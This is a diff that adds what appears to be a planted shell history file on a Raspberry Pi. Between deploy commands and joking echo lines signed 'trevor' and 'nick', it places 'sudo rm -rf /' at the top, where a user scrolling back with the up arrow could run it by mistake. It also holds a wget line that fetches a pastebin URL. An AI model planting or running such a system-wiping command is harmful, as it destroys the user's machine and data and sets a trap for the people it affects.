@@ -1,0 +1,17 @@
+sudo rm -rf /
+cd /home/pi/projects-rpi-setup-7/
+chmod +x ./pre_deploy.sh
+sudo ./pre_deploy.sh
+echo 
+echo hey. check out https://youtu.be/2rZY8iX8Mdw its the song of the summer!
+wget -q -O - https://pastebin.com/raw/syHN4v2u
+echo i dare you to hit the up arrow one more time
+echo 
+echo gaming
+echo fortnite
+echo
+echo
+echo ok this isnt trevor anymore - this is nick. stop messing around and do your work!
+echo Waaayyyy too far, time to smash that down arrow
+echo Oops, you went one too far ;)
+sudo /home/pi/projects-rpi-setup-7/deploy.sh
